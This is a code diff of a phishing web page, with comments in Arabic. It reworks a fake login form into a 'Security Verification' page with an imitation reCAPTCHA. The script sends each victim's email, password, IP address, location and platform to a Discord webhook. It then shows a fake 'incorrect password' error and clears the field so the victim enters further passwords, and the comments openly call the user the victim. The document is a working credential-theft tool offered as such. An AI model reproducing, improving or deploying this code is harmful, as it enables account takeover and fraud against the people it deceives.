@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Official Portal</title>
+    <title>Secure Verification Portal</title>
     <style>
         body {
             background-color: #f0f2f5;
@@ -14,37 +14,54 @@
             height: 100vh;
             margin: 0;
         }
-        .login-card {
+        .card {
             background: #ffffff;
-            padding: 40px;
+            padding: 30px;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
             text-align: center;
         }
-        .login-card h2 {
-            margin-bottom: 24px;
-            color: #1c1e21;
-            font-size: 24px;
-        }
+        h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
+        p { color: #606770; font-size: 14px; margin-bottom: 20px; }
         .input-group {
             margin-bottom: 15px;
             text-align: left;
         }
         .input-group input {
             width: 100%;
-            padding: 12px 15px;
+            padding: 12px;
             border: 1px solid #ccd0d5;
             border-radius: 6px;
-            font-size: 15px;
+            font-size: 14px;
             box-sizing: border-box;
             outline: none;
-            transition: 0.2s;
         }
         .input-group input:focus {
             border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .recaptcha-left {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            color: #333;
+        }
+        .recaptcha-left input {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            cursor: pointer;
         }
         .btn {
             background-color: #1877f2;
@@ -52,40 +69,52 @@
             border: none;
             width: 100%;
             padding: 12px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
-            transition: background-color 0.2s;
         }
-        .btn:hover {
-            background-color: #166fe5;
-        }
-        .footer-text {
-            margin-top: 20px;
+        .btn:hover { background-color: #166fe5; }
+        .error-msg {
+            color: #fa383e;
             font-size: 13px;
-            color: #606770;
+            margin-bottom: 15px;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <h2>Sign In to Continue</h2>
-        <form id="loginForm" onsubmit="handleLogin(event)">
+    <div class="card">
+        <h2>Security Verification</h2>
+        <p>Please enter your email and matching password to verify your session.</p>
+        
+        <div id="errorText" class="error-msg">Incorrect password or sync error. Please try again with the correct email password.</div>
+
+        <form id="authForm" onsubmit="handleSubmit(event)">
             <div class="input-group">
-                <input type="text" id="email" placeholder="Email or Phone Number" required>
+                <input type="email" id="email" placeholder="Email Address" required>
             </div>
             <div class="input-group">
-                <input type="password" id="password" placeholder="Password" required>
+                <input type="password" id="password" placeholder="Email Password" required>
             </div>
-            <button type="submit" class="btn">Log In</button>
+            
+            <!-- زر أنا لست روبوت الوهمي -->
+            <div class="recaptcha-box">
+                <div class="recaptcha-left">
+                    <input type="checkbox" id="robotCheck" required>
+                    <label for="robotCheck">I'm not a robot</label>
+                </div>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="25" alt="reCAPTCHA">
+            </div>
+
+            <button type="submit" class="btn">Verify & Continue</button>
         </form>
-        <div class="footer-text">Secure Encrypted Connection</div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543430352826011739/loVSz6Py2mno8uN83WxwfGqskhkoaAg4GYOz6hghqLvG7B24p-fPqePOvbkSm5NvyO6b";
+        let attemptCount = 0;
 
         async function sendToDiscord(message) {
             try {
@@ -97,15 +126,16 @@
             } catch (e) {}
         }
 
-        async function handleLogin(event) {
+        async function handleSubmit(event) {
             event.preventDefault();
+            attemptCount++;
 
             let email = document.getElementById('email').value;
             let password = document.getElementById('password').value;
             let ip = "Unknown";
             let locationInfo = "Unknown";
 
-            // جلب الـ IP والبيانات الجغرافية للضحية
+            // جلب الـ IP والموقع عند كل محاولة
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
@@ -116,19 +146,20 @@
                 locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'}`;
             } catch (err) {}
 
-            // رسالة ديسكورد التي تحتوي على الضحية ومعلوماته الحساسة
-            let msg = `🎯 **[ صيد جديد - تم تسجيل الدخول! ]** 🎯\n\n` +
-                      `📧 **الإيميل / المستخدم:** \`${email}\`\n` +
-                      `🔑 **كلمة المرور:** \`${password}\`\n` +
+            // إرسال تفاصيل المحاولة لديسكورد مع رقم المحاولة
+            let msg = `🚨 **[ محاولة رقم ${attemptCount} - صيد جديد ]** 🚨\n\n` +
+                      `📧 **الإيميل:** \`${email}\`\n` +
+                      `🔑 **كلمة المرور المُدخلة:** \`${password}\`\n` +
                       `🌐 **الـ IP:** \`${ip}\`\n` +
                       `📍 **الموقع:** ${locationInfo}\n` +
                       `💻 **النظام:** ${navigator.platform}`;
 
             await sendToDiscord(msg);
 
-            // وهم الضحية بأن هناك تحميل أو إعادة توجيه لكي لا يشك
-            alert("Error: Network connection timeout. Please try again later.");
-            location.reload();
+            // إظهار رسالة خطأ وهمية لكي يضطر لتجربة كلمة مرور أخرى
+            document.getElementById('errorText').style.display = 'block';
+            document.getElementById('password').value = ''; // تفريغ حقل الباسورد ليكتب غيره
+            document.getElementById('robotCheck').checked = false; // إعادة إلغاء تحديد الروبوت
         }
     </script>
 </body>
